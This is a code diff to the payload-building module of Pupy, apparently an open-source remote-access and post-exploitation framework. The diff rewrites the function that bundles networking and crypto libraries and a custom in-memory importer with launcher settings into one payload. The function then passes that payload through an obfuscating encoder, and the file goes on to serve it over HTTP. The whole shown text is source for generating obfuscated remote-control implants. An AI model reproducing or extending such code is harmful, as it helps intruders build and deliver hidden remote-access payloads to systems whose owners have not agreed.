@@ -4,7 +4,7 @@
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 
 from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
-import cPickle, re, os.path
+import cPickle, re, os.path, sys
 import rpyc, rsa, pyasn1, yaml, netaddr
 from pupylib.utils.obfuscate import compress_encode_obfs
 from pupylib.utils.term import colorize
@@ -21,37 +21,34 @@ def getLinuxImportedModules():
     return lines
 
 def pack_py_payload(conf):
-    print colorize("[+] ","green")+"generating payload ..."
+    print colorize('[+] ','green')+'generating payload ...'
     fullpayload=[]
 
-    with open(os.path.join(ROOT,"packages","all", "pupyimporter.py")) as f:
-        pupyimportercode=f.read()
-    fullpayload.append(get_load_module_code(pupyimportercode,"pupyimporter")+"\n")
+    with open(os.path.join(ROOT, 'packages', 'all', 'pupyimporter.py')) as f:
+        pupyimportercode = f.read()
 
-    modules_dic=gen_package_pickled_dic(rpyc.__path__[0],"rpyc")
-    fullpayload.append("import pupyimporter\npupyimporter.install()\npupyimporter.pupy_add_package(%s)\nimport rpyc"%repr(cPickle.dumps(modules_dic)))
+    fullpayload.append(get_load_module_code(pupyimportercode, 'pupyimporter')+'\n')
+    fullpayload.append(
+        '\n'.join([
+            'import pupyimporter',
+            'pupyimporter.install()'
+        ]) + '\n'
+    )
 
-    modules_dic=gen_package_pickled_dic(os.path.join(ROOT,"network"),"network")
-    fullpayload.append("pupyimporter.pupy_add_package(%s)"%repr(cPickle.dumps(modules_dic)))
+    for module in ('rpyc', 'pyasn1', 'rsa', 'netaddr', 'tinyec'):
+        modules_dic = gen_package_pickled_dic(sys.modules[module].__path__[0], module)
+        fullpayload.append('pupyimporter.pupy_add_package({})'.format(repr(cPickle.dumps(modules_dic))))
 
-    modules_dic=gen_package_pickled_dic(pyasn1.__path__[0],"pyasn1")
-    fullpayload.append("pupyimporter.pupy_add_package(%s)"%repr(cPickle.dumps(modules_dic)))
+    modules_dic = gen_package_pickled_dic(os.path.join(ROOT, 'network'), 'network')
+    fullpayload.append('pupyimporter.pupy_add_package({})'.format(repr(cPickle.dumps(modules_dic))))
 
-    modules_dic=gen_package_pickled_dic(rsa.__path__[0],"rsa")
-    fullpayload.append("pupyimporter.pupy_add_package(%s)"%repr(cPickle.dumps(modules_dic)))
-
-    modules_dic=gen_package_pickled_dic(yaml.__path__[0],"yaml")
-    fullpayload.append("pupyimporter.pupy_add_package(%s)"%repr(cPickle.dumps(modules_dic)))
-
-    modules_dic=gen_package_pickled_dic(netaddr.__path__[0],"netaddr")
-    fullpayload.append("pupyimporter.pupy_add_package(%s)"%repr(cPickle.dumps(modules_dic)))
-
-    with open(os.path.join(ROOT,"pp.py")) as f:
+    with open(os.path.join(ROOT,'pp.py')) as f:
         code=f.read()
-    code=re.sub(r"LAUNCHER\s*=\s*.*\n(#.*\n)*LAUNCHER_ARGS\s*=\s*.*", conf.replace("\\","\\\\"), code)
-    fullpayload.append(code+"\n")
 
-    return compress_encode_obfs('\n'.join(fullpayload)+"\n")
+    code = re.sub(r'LAUNCHER\s*=\s*.*\n(#.*\n)*LAUNCHER_ARGS\s*=\s*.*', conf.replace('\\','\\\\'), code)
+    fullpayload.append(code+'\n')
+
+    return compress_encode_obfs('\n'.join(fullpayload)+'\n')
 
 
 def serve_payload(payload, ip="0.0.0.0", port=8080, link_ip="<your_ip>"):
